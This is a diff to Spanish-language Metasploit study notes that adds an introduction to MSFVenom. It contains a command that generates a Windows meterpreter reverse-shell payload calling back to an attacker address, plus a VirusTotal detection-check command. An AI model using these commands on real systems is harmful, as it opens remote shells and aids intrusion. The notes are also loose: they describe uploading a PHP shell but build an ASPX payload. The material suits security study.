@@ -611,3 +611,25 @@ Nosotros deberemos descargar .rb El directorio cuando necesitamos el modulo, scr
 
 Nosotros podemos copiar apropiadamente el directorio despues de descargar el exploit. En caso deberemos crear una carpeta para los apropiados archivos que queramos meter.
 
+# INTRODUCCIÓN A MSFVENOM
+
+MSFVenom es el sucesor de MSFPayload y MSFEndoce, son los dos estandares que se utilizan en conjuncion trabajando con msfconsole para proveer de alta costumización y dificl detección de los exploits.
+
+MSFVenom es el resultado entre dos herramientas. Antes de esto se necseitaba generar una shell especifica para la arquitectura del procesador y del OS, y dentro del encode contener esquemas de codificacion para remover malos caracteres de la shell. Causando inestabilidad.
+
+## CREAR NUESTRO PAYLOAD
+
+Vamos a suponer que hay un puerto 21 abierto (FTP) esta abierto en Anonymous, ahora supone que esta linkeado con el 80 (HTTP) y vemos el directorio /uploads. En este caso sería simplemente subir una shell en PHP accediendo por FTP
+
+## GENERAR PAYLOAD
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
+```
+Navegariamos o hariamos un curl a la url donde esta alojado nuestra shell y ejecutariamos el payload igual que los anteriores casos.
+
+# VIRUS TOTAL
+
+```
+msf-virustotal -k <API key> -f test.js
+```
